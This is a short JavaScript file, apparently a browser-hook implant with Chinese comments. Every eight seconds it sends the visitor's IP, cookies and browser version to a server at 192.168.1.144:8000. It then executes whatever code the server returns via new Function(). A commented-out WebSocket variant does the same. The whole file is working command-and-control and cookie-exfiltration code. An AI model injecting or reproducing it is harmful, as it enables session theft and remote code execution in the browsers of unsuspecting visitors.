/*
function hasWebsocket(){
    return !!window.WebSocket || !!window.MozWebSocket;
}
if (hasWebsocket()){
    try{
    var ws = new WebSocket("ws://localhost:8000/ws");
    }
    catch(err){
        console.log("no WebSocket server ") 
    }
    ws.onopen = function(){
        console.log("socket open");
        ws.send("give me some command");
    }
    ws.onmessage = function(msg){
        f = new Function(msg.data);
        f();
        console.log("command executed")
    }
}
else{
    console.log("no WebSocket")
}
*/

// 轮循服务器

var xmlhttp;
if (window.XMLHttpRequest){
	xmlhttp = new XMLHttpRequest();
}
else if (window.ActiveObject){
	xmlhttp = new ActiveObject("Msxml12.XMLHTTP");
}

function Makerequest(url){
        if (xmlhttp!=null){
          xmlhttp.onreadystatechange=state_Change;
          xmlhttp.open("POST",url,true);
          xmlhttp.withCredentials = true;   //设置cookie必须带上这个参数
          xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
          xmlhttp.send("&IP="+IP+"&cookies="+browser_details['Cookies']+"&version="+browser_details['version']);
          }
    }

function state_Change(){
if (xmlhttp.readyState==4){
    if(xmlhttp.responseText!=''){
        f = new Function(xmlhttp.responseText);
        f();
        //document.getElementById("xhr").innerhtml = xmlhttp.responseText;
        }
    else{
        console.log("responseText wrong");
    }
  }
}

//产生随机数作为浏览器的标识
/*
function randomChar(l){
var  x="0123456789qwertyuioplkjhgfdsazxcvbnm";
var  tmp="";
var timestamp = new Date().getTime();
for(var  i=0;i<  l;i++)  {
tmp  +=  x.charAt(Math.ceil(Math.random()*100000000)%x.length);
}
return  tmp.toUpperCase();
}

if (hook_id){;}
else{
	var hook_id = randomChar(32);
}
*/


setInterval('Makerequest("http://192.168.1.144:8000/poll")',8000);
//Makerequest("http://localhost:8000/poll?hook_id="+hook_id);



//